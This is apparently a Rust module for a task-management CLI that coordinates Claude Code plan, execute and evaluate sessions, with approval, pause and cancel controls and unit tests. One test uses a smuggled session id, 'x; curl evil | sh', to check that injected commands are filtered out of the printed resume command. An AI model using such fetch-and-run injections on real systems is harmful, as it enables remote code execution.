use crate::error::FabrError;
use crate::fabric::{self, FabricListReq};
use crate::setup::{Ctx, settings_read};
use crate::taskrec::{Answer, Approval, GuiPatch, Question, State, TaskRecord, apply_gui, modify_record, parse};
use serde::Serialize;
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Serialize)]
pub struct Row {
    pub path: String,
    pub id: String,
    pub state: String,
    pub step: Option<String>,
    pub waiting: Option<String>,
    pub title: String,
    pub question: Option<String>,
}

fn now_utc() -> String {
    format!("{}Z", chrono::Utc::now().format("%Y-%m-%dT%H:%M:%S"))
}

fn name<T: Serialize>(v: &T) -> String {
    serde_json::to_value(v).ok().and_then(|v| v.as_str().map(String::from)).unwrap_or_default()
}

fn read(p: &Path) -> Result<TaskRecord, FabrError> {
    parse(&std::fs::read_to_string(p).map_err(|e| FabrError::Io(format!("{}: {e}", p.display())))?)
}

pub fn default_root(ctx: &Ctx) -> Result<PathBuf, FabrError> {
    Ok(PathBuf::from(settings_read(ctx)?.settings.default_folder))
}

fn list(root: &Path, ctx: &Ctx) -> Result<Vec<PathBuf>, FabrError> {
    let req = FabricListReq { root: root.to_string_lossy().into_owned(), home: None };
    Ok(fabric::list_in(&req, &ctx.home)?.records.into_iter().map(|f| PathBuf::from(f.path)).collect())
}

fn answered(q: &Question) -> bool {
    q.answer.as_ref().is_some_and(|a| a.value.is_some() || a.replacement.is_some() || a.granted.is_some())
}

fn open_question(r: &TaskRecord) -> Option<&Question> {
    r.question.as_ref().filter(|q| !answered(q))
}

fn approval_pending(r: &TaskRecord) -> bool {
    r.state == State::Defined && r.approval.as_ref().is_some_and(|a| a.status == "pending")
}

pub fn row(path: &Path, r: &TaskRecord) -> Row {
    let q = open_question(r);
    let waiting = if q.is_some() {
        Some("question")
    } else if approval_pending(r) {
        Some("approval")
    } else {
        None
    };
    Row {
        path: path.to_string_lossy().into_owned(),
        id: r.id.clone(),
        state: name(&r.state),
        step: r.step.as_ref().map(name),
        waiting: waiting.map(String::from),
        title: r.title.clone(),
        question: q.map(|q| q.text.clone()),
    }
}

pub fn status(root: &Path, ctx: &Ctx) -> Result<Vec<Row>, FabrError> {
    Ok(list(root, ctx)?.iter().filter_map(|p| read(p).ok().map(|r| row(p, &r))).collect())
}

pub fn status_text(rows: &[Row]) -> String {
    let mut out = String::new();
    for r in rows {
        out.push_str(&format!(
            "{:<36} {:<11} {:<9} {:<9} {}\n",
            r.id,
            r.state,
            r.step.as_deref().unwrap_or("-"),
            r.waiting.as_deref().unwrap_or("-"),
            r.title
        ));
        match (&r.waiting, &r.question) {
            (Some(_), Some(q)) => out.push_str(&format!("  question: {q}\n")),
            (Some(_), None) => out.push_str(&format!("  review with: fabr show {0}\n  approve with: fabr approve {0}\n", r.path)),
            _ => {}
        }
    }
    out
}

pub fn resolve(ctx: &Ctx, arg: &str) -> Result<PathBuf, FabrError> {
    let p = Path::new(arg);
    if p.is_file() {
        return p.canonicalize().map_err(|e| FabrError::Io(format!("{arg}: {e}")));
    }
    if arg.contains('/') || arg.ends_with(".md") {
        return Err(FabrError::NotFound(format!("no such record: {arg}")));
    }
    let root = default_root(ctx)?;
    let hits: Vec<PathBuf> = list(&root, ctx)?
        .into_iter()
        .filter(|p| {
            p.file_stem().and_then(|s| s.to_str()).is_some_and(|id| id.starts_with(arg) || id.get(11..).is_some_and(|s| s.starts_with(arg)))
        })
        .collect();
    match hits.as_slice() {
        [one] => Ok(one.clone()),
        [] => Err(FabrError::NotFound(format!("no record matches '{arg}' under {}; pass the .md path or run fabr status", root.display()))),
        many => {
            let ids: Vec<String> = many.iter().filter_map(|p| p.file_stem().map(|s| s.to_string_lossy().into_owned())).collect();
            Err(FabrError::BadRequest(format!("'{arg}' is ambiguous ({}); use a longer prefix", ids.join(", "))))
        }
    }
}

pub fn show(path: &Path) -> Result<String, FabrError> {
    let r = read(path)?;
    let mut s = format!("{}\nid: {}\nstate: {}\nstep: {}\n", r.title, r.id, name(&r.state), r.step.as_ref().map_or("-".into(), name));
    if r.paused {
        s.push_str("paused: yes\n");
    }
    if let Some(q) = open_question(&r) {
        s.push_str(&format!("question: {}\n", q.text));
        if let Some(o) = &q.options {
            s.push_str(&format!("options: {}\n", o.join(" | ")));
        }
    } else if approval_pending(&r) {
        s.push_str(&format!("approve with: fabr approve {} (read the plan, tools and checks below first)\n", path.display()));
    }
    if !r.plan.trim().is_empty() {
        s.push_str(&format!("\nPlan:\n{}\n", r.plan.trim()));
    }
    if let Some(m) = &r.plan_meta {
        let tools = if m.tools.is_empty() { "read only".to_string() } else { m.tools.join(", ") };
        s.push_str(&format!("\nTools the executor may use: Read, Glob, Grep, {tools}\n"));
        let reversible = m.reversibility.as_deref().unwrap_or("unknown");
        s.push_str(&format!("Reversible: {reversible}\n"));
        if reversible == "irreversible" {
            s.push_str("This cannot be undone.\n");
        }
        for c in &m.checks {
            s.push_str(&format!("Check: {} {}\n", c.cmd, c.args.join(" ")));
        }
    }
    if !r.assertions.is_empty() {
        s.push_str("\nAssertions:\n");
        for a in &r.assertions {
            s.push_str(&format!("  {}: {}\n", a.id, a.text));
        }
    }
    if let Some(v) = &r.verdict {
        s.push_str(&format!("\nVerdict: {} at {}\n", v.result, v.at));
        for i in &v.items {
            let ev = if i.evidence.is_empty() { String::new() } else { format!(": {}", i.evidence) };
            s.push_str(&format!("  {} {}{ev}\n", i.id, if i.pass { "pass" } else { "fail" }));
        }
    }
    s.push_str(&format!("\ncost: ${:.4}\n", r.cost_usd));
    let node = path.ancestors().nth(3).unwrap_or(Path::new("."));
    for (role, id) in [("plan", &r.sessions.plan), ("execute", &r.sessions.execute), ("evaluate", &r.sessions.evaluate)] {
        if let Some(id) = id.as_deref().filter(|id| crate::ccsession::valid_id(id)) {
            let dir = crate::ops::quote_sh(&node.to_string_lossy());
            s.push_str(&format!("session {role}: {id}\n  cd {dir} && claude --resume {id}\n"));
        }
    }
    Ok(s)
}

fn change(path: &Path, f: impl FnOnce(&mut TaskRecord) -> Result<(), FabrError>) -> Result<(), FabrError> {
    modify_record(path, &now_utc(), f)?.1
}

fn bad<T>(m: impl Into<String>) -> Result<T, FabrError> {
    Err(FabrError::BadRequest(m.into()))
}

fn terminal(r: &TaskRecord) -> bool {
    matches!(r.state, State::Succeeded | State::Failed)
}

pub fn delegate(path: &Path) -> Result<String, FabrError> {
    change(path, |r| {
        if r.state != State::Reminder {
            return bad(format!("delegate applies only to a reminder, this record is {}", name(&r.state)));
        }
        if r.requests.delegate {
            return bad("delegate is already requested");
        }
        let mut req = r.requests.clone();
        req.delegate = true;
        apply_gui(r, &GuiPatch { requests: Some(req), ..Default::default() });
        Ok(())
    })?;
    Ok("delegate requested".into())
}

pub fn answer(path: &Path, text: &str) -> Result<String, FabrError> {
    change(path, |r| {
        match r.question.as_ref() {
            None => return bad("no open question"),
            Some(q) if answered(q) => return bad("question is already answered"),
            _ => {}
        }
        let a = Answer { value: Some(text.into()), replacement: None, granted: None, by: Some("cli".into()), at: Some(now_utc()) };
        apply_gui(r, &GuiPatch { answer: Some(a), ..Default::default() });
        Ok(())
    })?;
    Ok("answer recorded".into())
}

fn decide(path: &Path, status: &str, note: Option<String>) -> Result<String, FabrError> {
    change(path, |r| {
        if !approval_pending(r) {
            return bad(format!("nothing to decide: needs state defined with approval pending, this record is {}", name(&r.state)));
        }
        let digest = r.approval.as_ref().and_then(|a| a.digest.clone());
        let a = Approval { status: status.into(), by: Some("cli".into()), at: Some(now_utc()), note, digest };
        apply_gui(r, &GuiPatch { approval: Some(a), ..Default::default() });
        Ok(())
    })?;
    Ok(status.into())
}

pub fn approve(path: &Path) -> Result<String, FabrError> {
    decide(path, "approved", None)
}

pub fn refuse(path: &Path, note: Option<String>) -> Result<String, FabrError> {
    decide(path, "refused", note)
}

pub fn request(path: &Path, key: &str) -> Result<String, FabrError> {
    change(path, |r| {
        let s = name(&r.state);
        let mut req = r.requests.clone();
        let (flag, ok) = match key {
            "cancel" => (&mut req.cancel, r.state == State::InProgress),
            "pause" => (&mut req.pause, r.step.is_some() && !r.paused && !r.requests.resume && !terminal(r)),
            "resume" => (&mut req.resume, r.paused && !r.requests.pause),
            _ => return bad(format!("unknown request {key}")),
        };
        if !ok {
            return bad(match key {
                "cancel" => format!("cancel applies only to an in_progress task, this record is {s}"),
                "pause" => format!("pause does not apply to a {s} task that is paused, resuming or has no step"),
                _ => "resume applies only to a paused task".into(),
            });
        }
        if *flag {
            return bad(format!("{key} is already requested"));
        }
        *flag = true;
        apply_gui(r, &GuiPatch { requests: Some(req), ..Default::default() });
        Ok(())
    })?;
    Ok(format!("{key} requested"))
}

pub fn ask(ctx: &Ctx, path: &Path, role: &str, text: &str) -> Result<String, FabrError> {
    let rec = parse(&std::fs::read_to_string(path).map_err(|e| FabrError::Io(format!("{}: {e}", path.display())))?)?;
    let id = match role {
        "plan" => rec.sessions.plan,
        "execute" => rec.sessions.execute,
        "evaluate" => rec.sessions.evaluate,
        _ => return Err(FabrError::BadRequest("role must be plan, execute or evaluate".into())),
    }
    .ok_or_else(|| FabrError::NotFound(format!("this task has no {role} session yet")))?;
    let folder = path
        .parent()
        .and_then(Path::parent)
        .and_then(Path::parent)
        .ok_or_else(|| FabrError::BadRequest("record is not inside a folder".into()))?;
    let configured = settings_read(ctx).map(|s| s.settings.claude_bin).unwrap_or_default();
    let bin = crate::ccsession::resolve_bin(&configured)
        .ok_or_else(|| FabrError::NotFound("Claude Code was not found; run fabr check claude".into()))?;
    let res = crate::ccsession::send(&bin, folder, &id, text, std::time::Duration::from_secs(crate::ccsession::SEND_TIMEOUT_S))?;
    Ok(format!("{}\n(${:.2})", res.reply, res.cost_usd))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fabric::FabricCreateReq;
    use crate::taskrec::{Assertion, Step, write_record};

    struct Env {
        _tmp: tempfile::TempDir,
        ctx: Ctx,
        proj: PathBuf,
    }

    fn env() -> Env {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let proj = home.join("proj");
        std::fs::create_dir_all(&proj).unwrap();
        std::fs::create_dir_all(home.join(".fabric-space")).unwrap();
        std::fs::write(home.join(".fabric-space/settings.toml"), format!("default_folder = \"{}\"\n", proj.display())).unwrap();
        Env { ctx: Ctx::new(&home), proj, _tmp: tmp }
    }

    fn new(e: &Env, title: &str) -> PathBuf {
        let req = FabricCreateReq {
            folder: e.proj.to_string_lossy().into_owned(),
            title: title.into(),
            due: None,
            pri: None,
            context: None,
            spec: None,
            success: None,
        };
        PathBuf::from(fabric::create_in(&req, &e.ctx.home).unwrap().path)
    }

    fn edit(p: &Path, f: impl FnOnce(&mut TaskRecord)) {
        let mut r = read(p).unwrap();
        let expected = r.updated_at.clone();
        f(&mut r);
        write_record(p, &r, Some(&expected)).unwrap();
    }

    fn ask(r: &mut TaskRecord) {
        r.state = State::Task;
        r.step = Some(Step::Define);
        r.waiting = true;
        r.question = Some(Question {
            id: "q1".into(),
            kind: "open".into(),
            text: "Which colour?".into(),
            options: None,
            prior: None,
            fields: None,
            asked_at: None,
            answer: None,
        });
    }

    fn pending(r: &mut TaskRecord) {
        r.state = State::Defined;
        r.step = Some(Step::Approve);
        r.approval = Some(Approval { status: "pending".into(), by: None, at: None, note: None, digest: Some("abc".into()) });
    }

    fn msg<T>(r: Result<T, FabrError>) -> String {
        r.err().unwrap().message()
    }

    #[test]
    fn ask_needs_a_known_role_and_an_existing_session() {
        let e = env();
        let p = new(&e, "Buy pla");
        assert!(matches!(super::ask(&e.ctx, &p, "chat", "hi"), Err(FabrError::BadRequest(_))));
        assert!(matches!(super::ask(&e.ctx, &p, "plan", "hi"), Err(FabrError::NotFound(_))));
    }

    #[test]
    fn delegate_sets_flag_only_on_reminder() {
        let e = env();
        let p = new(&e, "Buy pla");
        assert_eq!(delegate(&p).unwrap(), "delegate requested");
        assert!(read(&p).unwrap().requests.delegate);
        assert!(msg(delegate(&p)).contains("already"));
        edit(&p, |r| r.state = State::Task);
        assert!(msg(delegate(&p)).contains("only to a reminder"));
    }

    #[test]
    fn answer_fills_open_question_once() {
        let e = env();
        let p = new(&e, "Buy pla");
        assert_eq!(msg(answer(&p, "red")), "no open question");
        edit(&p, ask);
        answer(&p, "red").unwrap();
        let a = read(&p).unwrap().question.unwrap().answer.unwrap();
        assert_eq!((a.value.as_deref(), a.by.as_deref()), (Some("red"), Some("cli")));
        assert!(a.at.unwrap().ends_with('Z'));
        assert!(msg(answer(&p, "blue")).contains("already answered"));
    }

    #[test]
    fn approve_and_refuse_keep_digest() {
        let e = env();
        let p = new(&e, "Buy pla");
        assert!(msg(approve(&p)).contains("approval pending"));
        edit(&p, pending);
        approve(&p).unwrap();
        let a = read(&p).unwrap().approval.unwrap();
        assert_eq!((a.status.as_str(), a.by.as_deref(), a.digest.as_deref()), ("approved", Some("cli"), Some("abc")));
        assert!(msg(refuse(&p, None)).contains("approval pending"));
        edit(&p, pending);
        refuse(&p, Some("too risky".into())).unwrap();
        let a = read(&p).unwrap().approval.unwrap();
        assert_eq!((a.status.as_str(), a.note.as_deref(), a.digest.as_deref()), ("refused", Some("too risky"), Some("abc")));
    }

    #[test]
    fn cancel_pause_resume_follow_gui_rules() {
        let e = env();
        let p = new(&e, "Buy pla");
        assert!(msg(request(&p, "cancel")).contains("in_progress"));
        assert!(msg(request(&p, "pause")).contains("pause does not apply"));
        edit(&p, |r| {
            r.state = State::InProgress;
            r.step = Some(Step::Execute);
        });
        request(&p, "pause").unwrap();
        assert!(read(&p).unwrap().requests.pause);
        assert!(msg(request(&p, "resume")).contains("only to a paused"));
        edit(&p, |r| {
            r.requests.pause = false;
            r.paused = true;
        });
        assert!(msg(request(&p, "pause")).contains("pause does not apply"));
        request(&p, "resume").unwrap();
        assert!(read(&p).unwrap().requests.resume);
        assert!(msg(request(&p, "resume")).contains("already"));
        request(&p, "cancel").unwrap();
        assert!(read(&p).unwrap().requests.cancel);
    }

    #[test]
    fn status_lists_waiting_and_resolve_finds_prefix() {
        let e = env();
        let a = new(&e, "Alpha job");
        let b = new(&e, "Beta job");
        edit(&a, ask);
        edit(&b, pending);
        let rows = status(&e.proj, &e.ctx).unwrap();
        assert_eq!(rows.len(), 2);
        let w: Vec<_> = rows.iter().map(|r| r.waiting.as_deref()).collect();
        assert_eq!(w, [Some("question"), Some("approval")]);
        let text = status_text(&rows);
        assert!(text.contains("question: Which colour?") && text.contains(&format!("approve with: fabr approve {}", b.display())));
        assert!(serde_json::to_string(&rows).unwrap().contains("\"waiting\":\"approval\""));
        assert_eq!(resolve(&e.ctx, "alpha").unwrap(), a);
        let id = a.file_stem().unwrap().to_str().unwrap();
        assert_eq!(resolve(&e.ctx, id).unwrap(), a);
        assert_eq!(resolve(&e.ctx, a.to_str().unwrap()).unwrap(), a);
        assert!(msg(resolve(&e.ctx, "20")).contains("ambiguous"));
        assert!(msg(resolve(&e.ctx, "zzz")).contains("no record matches"));
    }

    #[test]
    fn show_prints_plan_sessions_and_resume_command() {
        let e = env();
        let p = new(&e, "Buy pla");
        edit(&p, |r| {
            pending(r);
            r.plan = "1. do it".into();
            r.sessions.plan = Some("0c15bc0c-4af9-4ba7-b36c-2a466a6ca85f".into());
            r.sessions.execute = Some("x; curl evil | sh".into());
            r.assertions = vec![Assertion { id: "a1".into(), text: "it works".into() }];
        });
        let s = show(&p).unwrap();
        assert!(s.starts_with("Buy pla\n") && s.contains("state: defined") && s.contains("1. do it") && s.contains("a1: it works"));
        assert!(s.contains(&format!("cd '{}' && claude --resume 0c15bc0c-4af9-4ba7-b36c-2a466a6ca85f", e.proj.display())), "{s}");
        assert!(!s.contains("curl evil"), "{s}");
        assert!(s.contains("approve with: fabr approve"));
    }
}
